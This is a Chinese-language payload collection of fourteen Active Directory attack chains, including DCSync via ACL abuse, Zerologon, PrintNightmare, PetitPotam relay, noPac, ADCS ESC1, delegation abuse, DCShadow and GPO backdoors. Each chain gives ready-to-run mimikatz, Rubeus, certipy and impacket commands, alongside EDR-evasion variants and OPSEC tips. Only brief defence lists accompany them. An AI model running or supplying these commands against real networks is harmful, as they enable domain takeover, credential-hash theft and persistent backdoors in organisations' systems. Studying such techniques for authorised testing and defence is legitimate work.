# 域渗透攻击

_14 条 intranet payload_

### 域内权限提升路径  `domain-privilege-escalation`
_利用ACL错误配置进行域权限提升_
子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`

**前置条件：**
- 域环境
- 普通域用户凭证
- BloodHound分析结果

**攻击链：**

**BloodHound分析**
> 查询到域管理员的最短路径
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**查找WriteDACL**
> 查找WriteDACL权限
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**利用WriteDACL**
> 添加DCSync权限
_platform: windows_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**执行DCSync**
> 执行DCSync获取域管哈希
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**查找GenericAll**
> 查找GenericAll权限
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**重置密码**
> 重置目标用户密码
_platform: windows_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR 绕过变体：**

**隐蔽操作**
> 指定域控制器操作
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```


**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。

**OPSEC 提示：**
- ACL修改会产生日志
- 优先使用隐蔽的权限
- BloodHound可以发现攻击路径

**概述：** Active Directory中的ACL错误配置允许低权限用户获取高权限。

**漏洞原理：** AD中的ACL配置错误可能允许低权限用户修改高权限对象的属性或权限。

**利用方法：** 利用流程：1) 使用BloodHound分析；2) 发现ACL攻击路径；3) 利用权限提升；4) 获取高权限。

**防御措施：** 防御措施：1) 定期审计ACL配置；2) 最小权限原则；3) 监控ACL修改；4) 部署异常检测。

---

### 跨域信任攻击  `domain-cross-trust`
_利用域信任关系进行跨域攻击_
子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`

**前置条件：**
- 已获取源域权限
- 存在域信任关系
- 目标域信息

**攻击链：**

**枚举信任关系**
> 枚举域信任关系
_platform: windows_
```
Get-NetDomainTrust
```

**枚举森林信任**
> 枚举森林信任关系
_platform: windows_
```
Get-NetForestTrust
```

**跨域用户枚举**
> 枚举目标域用户
_platform: windows_
```
Get-NetUser -Domain target.domain.com
```

**跨域组枚举**
> 枚举目标域组
_platform: windows_
```
Get-NetGroup -Domain target.domain.com
```

**SID History攻击**
> 利用SID History跨域提权
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```
**语法解析：**
- `/sids` — 添加目标域的SID _parameter_
- `519` — Enterprise Admins组的RID _value_

**跨域票据**
> 请求目标域票据
_platform: windows_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR 绕过变体：**

**隐蔽跨域**
> 指定目标域控制器枚举
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```


**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。

**OPSEC 提示：**
- 跨域攻击会产生日志
- SID History需要特殊权限
- 森林信任更安全

**概述：** 域信任关系允许跨域访问，攻击者可以利用信任关系进行横向移动。

**漏洞原理：** 域信任关系可能允许攻击者从一个域访问另一个域的资源，SID History可以用于跨域提权。

**利用方法：** 利用流程：1) 枚举信任关系；2) 分析信任类型；3) 利用信任关系；4) 跨域横向移动。

**防御措施：** 防御措施：1) 审计信任关系；2) 使用选择性认证；3) 监控跨域活动；4) 定期审查SID History。

---

### Zerologon攻击  `zerologon`
_CVE-2020-1472 Netlogon提权_
子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**前置条件：**
- 可访问域控制器RPC

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python zerologon_tester.py DC_NAME DC_IP
检测是否存在漏洞
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python zerologon_exploit.py DC_NAME DC_IP
将DC密码置空
```
**语法解析：**
- `zerologon_exploit.py` — 利用脚本 _keyword_
- `DC_NAME` — 域控制器名称 _keyword_

**导出哈希**
> 导出哈希
_platform: linux_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
导出域内所有哈希
```

**恢复密码**
> 恢复密码
_platform: linux_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
恢复域控密码避免破坏
```


**概述：** Zerologon可重置域控制器密码为空。

**漏洞原理：** Netlogon协议加密缺陷。

**利用方法：** 利用流程：1) 检测漏洞 2) 重置密码 3) 导出哈希 4) 恢复密码

**防御措施：** 防御措施：1) 安装补丁 2) 强制安全RPC 3) 监控异常登录

---

### PrintNightmare攻击  `printnightmare`
_CVE-2021-34527 打印服务漏洞_
子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**前置条件：**
- 可访问打印服务RPC

**攻击链：**

**检测漏洞**
> 检测打印服务
_platform: linux_
```
rpcdump.py @DC_IP | grep MS-RPRN
检查打印服务是否可用
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
加载恶意DLL获取SYSTEM权限
```
**语法解析：**
- `-target` — 目标IP _parameter_
- `-payload` — 恶意DLL路径 _parameter_

**Impacket利用**
> 使用Impacket
_platform: linux_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
触发加载远程DLL
```


**概述：** PrintNightmare可远程执行代码。

**漏洞原理：** 打印服务存在远程代码执行漏洞。

**利用方法：** 利用流程：1) 检测打印服务 2) 构造恶意DLL 3) 触发加载

**防御措施：** 防御措施：1) 安装补丁 2) 禁用打印服务 3) 网络隔离

---

### PetitPotam攻击  `petitpotam`
_CVE-2021-36942 强制认证攻击_
子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**前置条件：**
- 可访问EFSRPC接口

**攻击链：**

**启动中继**
> 启动NTLM中继
_platform: linux_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
设置NTLM中继到ADCS
```

**触发认证**
> 触发认证
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
强制DC向攻击者认证
```
**语法解析：**
- `petitpotam.py` — PetitPotam利用脚本 _keyword_
- `attacker_ip` — 中继服务器IP _keyword_

**获取证书**
> 获取证书
_platform: linux_
```
中继成功后获取用户证书
使用证书进行Pass-the-Cert
```


**概述：** PetitPotam可强制机器账户认证。

**漏洞原理：** EFSRPC接口可被滥用。

**利用方法：** 利用流程：1) 启动中继 2) 触发认证 3) 中继到ADCS

**防御措施：** 防御措施：1) 安装补丁 2) 禁用EFSRPC 3) 保护ADCS

---

### noPac/SAMAccountName攻击  `samaccountname`
_CVE-2021-42278/CVE-2021-42287 域提权_
子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**前置条件：**
- 普通域用户权限

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
检测是否存在漏洞
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取域管权限
```
**语法解析：**
- `-dc-ip` — 域控制器IP _parameter_
- `-shell` — 获取Shell _parameter_

**攻击原理**
> 攻击原理
```
1. 创建机器账户(名称类似DC)
2. 清除SPN
3. 请求TGT
4. 删除机器账户
5. 获取域管TGT
```


**概述：** noPac可从普通用户提权到域管理员。

**漏洞原理：** SAM-Account-Name欺骗和PAC验证缺陷。

**利用方法：** 利用流程：1) 创建机器账户 2) 清除SPN 3) 获取域管TGT

**防御措施：** 防御措施：1) 安装补丁 2) 限制机器账户创建 3) 监控异常账户

---

### ADCS滥用攻击  `adcs-abuse`
_Active Directory证书服务滥用_
子类：**ADCS** · tags: `adcs` `certificate` `domain`

**前置条件：**
- ADCS服务可访问

**攻击链：**

**枚举ADCS**
> 枚举ADCS配置
_platform: linux_
```
certipy find -u user@domain -p password -dc-ip DC_IP
枚举证书模板
```

**请求用户证书**
> 请求证书
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
请求用户证书
```
**语法解析：**
- `certipy req` — 请求证书命令 _keyword_
- `-ca` — 证书颁发机构 _parameter_
- `-template` — 证书模板 _parameter_

**Pass-the-Cert**
> 使用证书认证
_platform: linux_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
使用证书获取TGT
```

**Rubeus请求**
> Rubeus利用
_platform: windows_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
使用Rubeus请求TGT
```


**概述：** ADCS可被滥用获取用户证书进行认证。

**漏洞原理：** 证书模板配置不当。

**利用方法：** 利用流程：1) 枚举ADCS 2) 请求证书 3) Pass-the-Cert

**防御措施：** 防御措施：1) 审计证书模板 2) 限制模板权限 3) 监控证书请求

---

### ADCS ESC1漏洞  `adcs-esc1`
_证书模板ESC1滥用_
子类：**ADCS** · tags: `adcs` `esc1` `certificate`

**前置条件：**
- 存在ESC1配置的模板

**攻击链：**

**识别ESC1**
> 识别漏洞模板
_platform: linux_
```
certipy find -u user@domain -p password -vulnerable
查找ESC1漏洞模板
```

**利用ESC1**
> 请求域管证书
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
指定SAN为域管
```
**语法解析：**
- `-alt` — 指定Subject Alternative Name _parameter_
- `admin@domain` — 目标用户UPN _value_

**认证为域管**
> 认证为域管
_platform: linux_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
使用证书认证为域管
```


**概述：** ESC1允许在证书请求中指定任意SAN。

**漏洞原理：** 模板允许用户指定SAN且可用于客户端认证。

**利用方法：** 利用流程：1) 找到ESC1模板 2) 指定域管SAN 3) 获取域管证书

**防御措施：** 防御措施：1) 禁用SAN指定 2) 限制模板权限 3) 监控证书请求

---

### 约束委派攻击  `constrained-delegation`
_利用约束委派进行横向移动_
子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`

**前置条件：**
- 存在约束委派配置的账户

**攻击链：**

**查找约束委派**
> 查找约束委派账户
_platform: windows_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
或
bloodhound查询
```

**获取服务票据**
> S4U2Self + S4U2Proxy
_platform: windows_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
获取域管的服务票据
```
**语法解析：**
- `s4u` — S4U扩展 _keyword_
- `/impersonateuser` — 模拟的用户 _parameter_
- `/msdsspn` — 目标服务SPN _parameter_

**使用票据**
> 注入票据
_platform: windows_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
注入票据并访问服务
```


**概述：** 约束委派允许账户模拟用户访问特定服务。

**漏洞原理：** 约束委派配置可被滥用。

**利用方法：** 利用流程：1) 找到委派账户 2) S4U获取票据 3) 访问目标服务

**防御措施：** 防御措施：1) 审计委派配置 2) 使用受保护用户组 3) 监控S4U请求

---

### 基于资源的约束委派  `resource-delegation`
_利用RBCD进行权限提升_
子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`

**前置条件：**
- 对目标对象有WriteDACL权限

**攻击链：**

**创建机器账户**
> 创建机器账户
_platform: windows_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
创建新的机器账户
```

**配置RBCD**
> 配置RBCD
_platform: windows_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
设置委派关系
```
**语法解析：**
- `PrincipalsAllowedToDelegateToAccount` — 允许委派的账户 _keyword_

**利用RBCD**
> 利用RBCD
_platform: windows_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
获取域管票据
```


**概述：** RBCD允许从目标对象配置委派关系。

**漏洞原理：** 对对象有WriteDACL权限可配置RBCD。

**利用方法：** 利用流程：1) 创建机器账户 2) 配置RBCD 3) 获取高权限票据

**防御措施：** 防御措施：1) 审计ACL权限 2) 保护关键对象 3) 监控RBCD配置

---

### DCShadow攻击  `dcshadow-attack`
_伪造域控制器注入数据_
子类：**DCShadow** · tags: `dcshadow` `domain` `injection`

**前置条件：**
- 域管理员权限
- 可注册新DC

**攻击链：**

**注册伪造DC**
> 注册伪造DC
_platform: windows_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
注册伪造DC并修改对象属性
```
**语法解析：**
- `lsadump::dcshadow` — DCShadow模块 _command_
- `/object` — 目标对象DN _parameter_
- `/attribute` — 要修改的属性 _parameter_

**推送更改**
> 推送更改
_platform: windows_
```
在另一个终端:
mimikatz # lsadump::dcshadow /push
推送更改到真实DC
```

**常见利用**
> 常见利用场景
_platform: windows_
```
修改用户组:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
添加SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```


**概述：** DCShadow可伪造DC向真实DC注入数据。

**漏洞原理：** AD复制机制可被滥用。

**利用方法：** 利用流程：1) 获取域管权限 2) 注册伪造DC 3) 推送恶意数据

**防御措施：** 防御措施：1) 监控DC注册 2) 审计复制事件 3) 保护域管账户

---

### 组策略滥用  `group-policy-abuse`
_滥用组策略进行横向移动_
子类：**组策略** · tags: `gpo` `group-policy` `domain`

**前置条件：**
- GPO编辑权限

**攻击链：**

**查找可编辑GPO**
> 查找可编辑GPO
_platform: windows_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
查找Domain Users可编辑的GPO
```

**添加计划任务**
> 添加计划任务
_platform: windows_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
添加立即执行的计划任务
```
**语法解析：**
- `New-GPOImmediateTask` — 创建立即任务 _keyword_
- `-GPODisplayName` — 目标GPO名称 _parameter_

**添加注册表项**
> 添加注册表启动项
_platform: windows_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```


**概述：** 组策略可被滥用在目标机器执行代码。

**漏洞原理：** 用户对GPO有编辑权限。

**利用方法：** 利用流程：1) 找到可编辑GPO 2) 添加恶意配置 3) 等待应用

**防御措施：** 防御措施：1) 审计GPO权限 2) 监控GPO变更 3) 限制编辑权限

---

### SAM The Admin攻击  `sam-the-admin`
_CVE-2021-42278/CVE-2021-42287域提权_
子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**前置条件：**
- 域用户权限
- 域控制器存在漏洞

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
检测是否存在漏洞
```

**利用漏洞**
> 获取域控权限
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取SYSTEM Shell
```
**语法解析：**
- `CVE-2021-42278` — sAMAccountName欺骗 _keyword_
- `CVE-2021-42287` — Kerberos PAC验证绕过 _keyword_

**执行命令**
> 执行命令
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```


**概述：** SAM The Admin利用sAMAccountName欺骗和PAC验证绕过提权。

**漏洞原理：** 域控制器未安装相关补丁。

**利用方法：** 利用流程：1) 创建机器账户 2) 修改sAMAccountName 3) 请求TGT 4) 删除账户 5) 请求S4U2Self

**防御措施：** 防御措施：1) 安装KB5008102补丁 2) 监控异常账户创建 3) 审计sAMAccountName修改

---

### NoAuth攻击  `noauth`
_CVE-2022-33679 Kerberos认证绕过_
子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**前置条件：**
- 域用户权限
- 目标账户有RC4密钥

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
检测是否存在漏洞
```

**利用漏洞**
> 获取TGT
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
获取目标用户TGT
```
**语法解析：**
- `CVE-2022-33679` — Kerberos RC4弱验证 _keyword_
- `RC4密钥` — 利用RC4加密类型绕过验证 _keyword_

**使用TGT**
> 使用获取的TGT
_platform: linux_
```
设置KRB5CCNAME环境变量
export KRB5CCNAME=administrator.ccache
使用psexec.py等工具
```


**概述：** NoAuth利用Kerberos RC4加密的验证缺陷。

**漏洞原理：** Kerberos RC4加密验证存在缺陷。

**利用方法：** 利用流程：1) 检测目标RC4密钥 2) 构造恶意请求 3) 获取TGT

**防御措施：** 防御措施：1) 安装补丁 2) 禁用RC4加密 3) 强制AES加密

---
